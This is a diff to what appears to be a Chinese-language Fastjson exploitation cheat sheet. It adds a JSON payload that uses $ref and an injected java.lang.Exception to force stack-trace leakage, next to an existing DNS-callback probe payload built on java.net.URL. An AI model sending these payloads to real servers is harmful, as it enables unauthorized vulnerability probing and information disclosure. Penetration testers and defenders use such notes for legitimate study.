@@ -125,6 +125,12 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 
 {"xxx":{payload}}
 ```
+## 获得报错信息
+
+```
+{"name":{"$ref":"$.x.stackTrace"},"x":{"@type":"java.lang.Exception","val":"test"}}
+```
+
 
 ## 各版本利用
 
